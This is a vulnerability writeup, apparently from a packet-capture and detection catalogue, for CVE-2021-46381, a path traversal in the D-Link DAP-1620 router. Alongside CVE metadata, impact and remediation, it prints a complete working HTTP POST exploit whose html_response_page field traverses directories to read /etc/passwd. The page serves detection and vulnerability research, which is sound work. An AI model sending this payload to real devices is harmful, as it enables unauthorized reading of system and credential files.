---
layout: post
cve_id: CVE-2021-46381
title: D-Link DAP-1620 - Local File Inclusion
pcap: true
pcap_path: /pcaps/2021/CVE-2021-46381.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-46381.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: high
impact: 'An attacker can exploit this vulnerability to access sensitive information,
  such as configuration files or credentials, leading to further compromise of the
  device or network.

  '
remediation: 'Apply the latest firmware update provided by D-Link to fix the local
  file inclusion vulnerability.

  '
reference:
- https://drive.google.com/drive/folders/19OP09msw8l7CJ622nkvnvnt7EKun1eCG?usp=sharing
- https://www.dlink.com/en/security-bulletin/
- https://nvd.nist.gov/vuln/detail/CVE-2021-46381
- http://packetstormsecurity.com/files/167070/DLINK-DAP-1620-A1-1.01-Directory-Traversal.html
- https://github.com/SYRTI/POC_to_review
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-46381
  cwe-id: CWE-22
  epss-score: 0.90499
  epss-percentile: 0.99587
  cpe: cpe:2.3:h:dlink:dap-1620:-:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: dlink
  product: dap-1620
tags:
- cve2021
- cve
- lfi
- router
- packetstorm
- dlink
- vkev
- vuln
---

## üîç Vulnerability Description
D-Link DAP-1620 is susceptible to local file Inclusion due to path traversal that can  lead to unauthorized internal files reading [/etc/passwd] and [/etc/shadow].

## üåê HTTP Request
```nohighlight
POST /apply.cgi HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.5 Safari/605.1.15 AlohaBrowser/7.6.0
Connection: close
Content-Length: 261
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
action=do_graph_auth&graph_code=94102&html_response_message=just_login&html_response_page=../../../../../../../../../../../../../../etc/passwd&log_pass=DummyPass&login_n=admin&login_name=DummyName&tkn=634855349&tmp_log_pass=DummyPass&tmp_log_pass_auth=DummyPass
```

